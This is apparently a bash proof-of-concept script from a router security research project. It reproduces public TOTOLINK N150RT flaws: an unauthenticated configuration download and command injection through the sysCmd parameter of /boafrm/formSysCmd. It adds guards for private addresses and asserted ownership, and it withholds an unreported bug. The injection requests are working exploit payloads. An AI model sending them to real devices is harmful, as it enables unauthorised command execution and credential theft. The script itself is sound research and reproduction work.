#!/usr/bin/env bash
# Reproduce the two PUBLIC chains on a TOTOLINK N150RT, or on an emulated copy.
#
#   ./run.sh --emulated
#   ./run.sh --target 10.1.1.1 --i-own-this-device
#
# What this script will not do
# ----------------------------
# Only issues that are already public are reproduced here: CVE-2019-19822 and
# CVE-2019-19823 (December 2019) and CVE-2024-51228 (2024-11-27). The
# unauthenticated administrator-password takeover this project measured on the
# same evening is NOT in this file and there is no flag that adds it, because
# nothing about it has been reported to anyone yet. See poc/04-auth-takeover.md
# and docs/disclosure.md.
#
# Why every step checks first
# ---------------------------
# A PoC script that prints "done" without checking anything is the same object
# as a self-check that never fails, and this repository has twenty-odd recorded
# instances of that costing a day. So each step states its precondition, and a
# failure names the step rather than the symptom.
#
# The results depend on the build. This unit runs
# TOTOLINK-CX-N150RT-V2.1.6-B20171121.1002, which is on no download page; yours
# will differ, and where a check below is about the build rather than about your
# setup it says so.
set -uo pipefail

MODE=""; TARGET=""; PORT=80; OWNED=0; KEEP=0
here() { cd "$(dirname "$0")/.." || exit 1; }

usage() {
  sed -n '2,30p' "$0" | sed 's/^# \{0,1\}//'
  exit 2
}

while [ $# -gt 0 ]; do
  case "$1" in
    --emulated)           MODE=emulated; TARGET=127.0.0.1; PORT=8080 ;;
    --target)             MODE=target; TARGET="${2:-}"; shift ;;
    --port)               PORT="${2:-}"; shift ;;
    --i-own-this-device)  OWNED=1 ;;
    --keep)               KEEP=1 ;;
    -h|--help)            usage ;;
    *) echo "unknown argument: $1" >&2; usage ;;
  esac
  shift
done
[ -n "$MODE" ] || usage

pass=0; failed=0; skipped=0
ok()   { printf '  \033[32mok\033[0m    %s\n' "$1"; pass=$((pass + 1)); }
bad()  { printf '  \033[31mFAIL\033[0m  %s\n' "$1"; printf '        %s\n' "${2:-}"; failed=$((failed + 1)); }
# A documented limitation is not a failure. Reporting it as one meant --emulated
# could never exit 0, which makes the exit status useless in exactly the mode a
# stranger runs. It still has to be LOUD, though: a skip that scrolls past is how
# "covered" quietly comes to mean "not run".
skip() { printf '  \033[33m--\033[0m    %s\n' "$1"; printf '        %s\n' "${2:-}"; skipped=$((skipped + 1)); }
die()  { printf '  \033[31mSTOP\033[0m  %s\n' "$1" >&2; printf '        %s\n' "${2:-}" >&2; exit 1; }
step() { printf '\n\033[1m== %s\033[0m\n' "$1"; }

U="http://$TARGET:$PORT"
[ "$PORT" = 80 ] && U="http://$TARGET"

# --------------------------------------------------------------- guards ----
step "preconditions"

if [ "$MODE" = target ]; then
  # An address, and a PRIVATE one. Nothing here is safe to point at a device
  # somebody else is using, and "I typed the wrong octet" is a mistake that
  # should stop at an argument check rather than at an abuse report.
  case "$TARGET" in
    10.*|192.168.*|172.1[6-9].*|172.2[0-9].*|172.3[01].*) ;;
    "") die "no --target given" "e.g. --target 192.168.1.1" ;;
    *)  die "$TARGET is not an RFC 1918 address" \
            "This reproduces a remote code execution issue. It runs against a
        device on your own bench, or it does not run." ;;
  esac
  [ "$OWNED" = 1 ] || die "refusing to send anything without --i-own-this-device" \
      "The flag is the whole point: it is a statement, not a formality."
  ok "target $TARGET is private, and ownership is asserted"

  # Directly attached, not via a gateway. A reply that came back through a
  # router proves the route works and nothing about what answered.
  if command -v ip >/dev/null 2>&1; then
    if ip route get "$TARGET" 2>/dev/null | head -1 | grep -q ' via '; then
      bad "$TARGET is reached through a gateway" \
          "Not fatal, but ttl will be 63 and you are not measuring a directly
        attached device. runsheet.md A3.1 sets up a direct segment."
    else
      ok "directly attached (no gateway in the route)"
    fi
  fi
else
  command -v sudo >/dev/null 2>&1 || die "emulated mode needs sudo" ""
  [ -f tools/qemu-env.sh ] || die "tools/qemu-env.sh is missing" "run from the repo root"
  ok "emulated mode: the target is a local qemu-user process"
fi

command -v curl >/dev/null 2>&1 || die "curl is not installed" "apt install curl"
ok "curl present"

# --------------------------------------------------------------- reach -----
step "is anything answering?"

code="$(curl -s -o /dev/null -m 8 -w '%{http_code}' "$U/" 2>/dev/null)"
[ "$code" = "000" ] && die "nothing answered at $U" \
  "In target mode: is it powered, and did a previous run leave boa dead? Nothing
        respawns it — power-cycle and allow 45 s.
        In emulated mode: sudo tools/qemu-env.sh serve $PORT"
ok "HTTP $code from $U/"

banner="$(curl -s -D - -o /dev/null -m 8 "$U/" 2>/dev/null | tr -d '\r' \
          | awk 'tolower($1)=="server:"{print $2}')"
case "$banner" in
  Boa/0.94*) ok "server banner is $banner" ;;
  "")        bad "no Server header" "Something is answering, but it is not announcing itself as Boa." ;;
  *)         die "server banner is $banner, expected Boa/0.94.x" \
                 "This is not the web server these chains are about. Stopping
        before sending anything else — pointing this at the wrong device is the
        mistake that matters." ;;
esac

# ------------------------------------------------- chain 1: disclosure -----
step "chain 1 — CVE-2019-19822 / 19823: read the configuration, unauthenticated"

OUT="${TMPDIR:-/tmp}/poc-config.dat"
if [ "$MODE" = emulated ]; then
  skip "not reproducible in emulated mode, and the reason is a finding" \
      "boa takes SIGBUS while GENERATING /web/config.dat under qemu-user, at an
        unaligned halfword store the device's kernel fixes up. Making that one
        open() fail is what lets the server run at all — so the file this chain
        downloads does not exist there. See poc/01-config-disclosure.md."
else
  code="$(curl -s -m 15 -o "$OUT" -w '%{http_code}' "$U/config.dat")"
  if [ "$code" != "200" ]; then
    bad "GET /config.dat returned $code, expected 200" \
        "On a build where the gate covers it, this is the honest negative result."
  elif [ "$(head -c 6 "$OUT")" != "COMPCS" ]; then
    bad "200, but the body does not begin COMPCS" \
        "$(head -c 32 "$OUT" | od -c | head -1)"
  else
    ok "GET /config.dat -> 200, $(stat -c %s "$OUT") bytes, magic COMPCS, no credentials sent"
    if command -v fwrecon >/dev/null 2>&1 || [ -x "$HOME/fwre-work/venv/bin/python" ]; then
      ok "a decoder is available: fwrecon compcs \"$OUT\" --offset 0 --mib <libapmib.so>"
      printf '        (not run here — it prints credentials, and this script does not)\n'
    else
      bad "no fwrecon on PATH" "make venv, then see poc/01-config-disclosure.md step 3"
    fi
  fi
fi

# --------------------------------------------------- chain 2: execution ----
step "chain 2 — CVE-2024-51228: command execution, unauthenticated"

MARK="poc-$$"
curl -s -o /dev/null -m 25 -X POST "$U/boafrm/formSysCmd" \
  --data-urlencode "sysCmd=cat /etc/version > /var/web/$MARK.txt;#" \
  --data 'submit-url=/syscmd.htm' 2>/dev/null
sleep 3
body="$(curl -s -m 10 "$U/$MARK.txt" 2>/dev/null)"

case "$body" in
  "")
    bad "no output came back" \
        "Three things to separate, in this order:
        1. is the server still up?   curl -sf $U/ >/dev/null
        2. did the request arrive?   a 000 status means it never left
        3. is the parameter name right? sysCmd is case-sensitive
        Only after those three is 'the parameter is filtered' the answer.
        NOTE: a file that exists but is EMPTY means the ;# was dropped — the
        handler appends '2>&1 > /tmp/syscmd.log' and the last redirection wins." ;;
  TOTOLINK*)
    ok "command output retrieved over HTTP: $body"
    ok "that string is the build identifier, so this both proves execution and
        names the firmware in one request" ;;
  *)
    ok "command output retrieved: $body"
    printf '        (not a TOTOLINK build string — your /etc/version differs)\n' ;;
esac

# The control. Without it, "a file appeared" is not attributable to the payload.
#
# Judge it on the STATUS CODE, not on whether the body is empty. This server
# answers a missing file with a 302 and a redirect page, so "the body is
# non-empty" is true for a file that does not exist — the first version of this
# control failed for that reason and would have kept failing forever, which is
# a control that cannot distinguish the thing it was written to distinguish.
CTRL="poc-ctrl-$$"
curl -s -o /dev/null -m 20 -X POST "$U/boafrm/formSysCmd" \
  --data 'submit-url=/syscmd.htm' 2>/dev/null
sleep 2
ccode="$(curl -s -o /dev/null -m 10 -w '%{http_code}' "$U/$CTRL.txt" 2>/dev/null)"
if [ "$ccode" != "200" ]; then
  ok "control: a POST carrying no sysCmd creates nothing (HTTP $ccode for the name it would have written)"
else
  bad "control failed: HTTP 200 for a file nothing wrote" \
      "Something is serving that path. Until this passes, a 200 in the step above
        is not attributable to the payload."
fi

if [ "$KEEP" = 0 ]; then
  curl -s -o /dev/null -m 20 -X POST "$U/boafrm/formSysCmd" \
    --data-urlencode "sysCmd=rm -f /var/web/$MARK.txt;#" \
    --data 'submit-url=/syscmd.htm' 2>/dev/null
  sleep 2
  code="$(curl -s -o /dev/null -m 10 -w '%{http_code}' "$U/$MARK.txt" 2>/dev/null)"
  [ "$code" = "200" ] && bad "cleanup did not remove /$MARK.txt" "remove it by hand" \
                      || ok "cleaned up (/var is a tmpfs, but do not rely on a reboot to prove it)"
fi

# ------------------------------------------------------------------ end ----
printf '\n  %d ok, %d failed, %d not applicable here\n' "$pass" "$failed" "$skipped"
if [ "$failed" -gt 0 ]; then
  printf '  Some steps failed. Each names what to check — a failure here is a
  result about your build, not necessarily a broken script.\n'
  exit 1
fi
printf '  Both public chains reproduced. The third link — pointing at the bytes
  this changed on the flash — needs a serial console: poc/03-flash-evidence.md\n'
